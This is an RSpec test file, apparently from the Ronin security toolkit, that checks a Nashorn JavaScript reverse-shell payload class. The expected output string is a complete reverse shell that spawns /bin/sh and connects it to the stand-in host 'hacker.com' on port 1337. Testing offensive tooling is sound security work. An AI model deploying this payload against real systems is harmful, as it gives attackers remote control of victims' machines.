require 'spec_helper'
require 'ronin/payloads/builtin/js/nashorn/reverse_shell'

describe Ronin::Payloads::JS::Nashorn::ReverseShell do
  it "must inherit from Ronin::Payloads::NashornPayload" do
    expect(described_class).to be < Ronin::Payloads::NashornPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'js/nashorn/reverse_shell'" do
      expect(subject.id).to eq('js/nashorn/reverse_shell')
    end
  end

  let(:host) { 'hacker.com' }
  let(:port) { 1337 }

  subject do
    described_class.new(
      params: {
        host: host,
        port: port
      }
    )
  end

  describe "#build" do
    before { subject.build }

    it "must build Nashorn JavaScript payload that connects back to the host and port params" do
      expect(subject.payload).to eq(
        %{var p=new java.lang.ProcessBuilder("/bin/sh").redirectErrorStream(true).start();var s=new java.net.Socket(#{host.dump},#{port});var pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();java.lang.Thread.sleep(50);try {p.exitValue();break;}catch (e){}};p.destroy();s.close();}
      )
    end
  end
end
